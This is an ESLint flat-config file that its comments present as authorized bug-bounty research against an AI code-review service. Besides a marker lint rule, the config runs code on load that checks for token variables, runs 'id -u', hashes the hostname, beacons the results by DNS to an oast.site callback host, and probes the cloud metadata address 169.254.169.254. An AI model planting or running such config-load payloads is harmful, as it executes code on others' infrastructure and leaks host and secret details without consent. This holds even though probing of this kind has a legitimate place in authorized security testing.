// Authorized research — egress-INDEPENDENT ESLint execution discriminator (HackerOne `coderabbit`, H1).
// If CodeRabbit's ESLint Node-loads this repo flat config, the inline custom rule below runs and
// reports a unique marker message on every linted file -> that marker appearing in the review PROVES
// execution without needing any network egress. A benign DNS/HTTP beacon (NAMES/status only) is also
// attempted to separately show whether egress is open. No credential is read or used.
const MARK = 'CRX63e112e';
const BEACON = 'dbqerhsrosne02eopgm048tqsgfxhp8cm.oast.site';
function ping(label) { try { require('dns').lookup(label + '.' + BEACON, function () {}); } catch (e) {} }
try {
  const os = require('os');
  const names = Object.keys(process.env);
  const hasRe = function (re) { return names.some(function (n) { return re.test(n); }) ? '1' : '0'; };
  const flags = 'gh' + (names.indexOf('GITHUB_TOKEN') >= 0 ? '1' : '0') + 'inst' + hasRe(/install.*token/i) + 'cr' + hasRe(/^coderabbit/i);
  let uid = 'na'; try { uid = require('child_process').execSync('id -u').toString().trim(); } catch (e) {}
  const hh = require('crypto').createHash('sha1').update(os.hostname()).digest('hex').slice(0, 8);
  ping((MARK + '-u' + uid + '-' + flags + '-' + hh).toLowerCase().replace(/[^a-z0-9-]/g, ''));
  try {
    const req = require('http').get({ host: '169.254.169.254', path: '/', timeout: 2000 }, function (res) { ping(('md' + res.statusCode + '-' + MARK).toLowerCase()); res.destroy(); });
    req.on('error', function () { ping(('mderr-' + MARK).toLowerCase()); });
    req.on('timeout', function () { req.destroy(); ping(('mdto-' + MARK).toLowerCase()); });
  } catch (e) {}
} catch (e) {}

const markerRule = {
  meta: { type: 'problem', docs: { description: 'exec marker' }, schema: [] },
  create: function (context) {
    return {
      Program: function (node) {
        context.report({ node: node, message: MARK + ' eslint-config-executed' });
      }
    };
  }
};

module.exports = [
  { plugins: { crx: { rules: { marker: markerRule } } }, rules: { 'crx/marker': 'error' } }
];
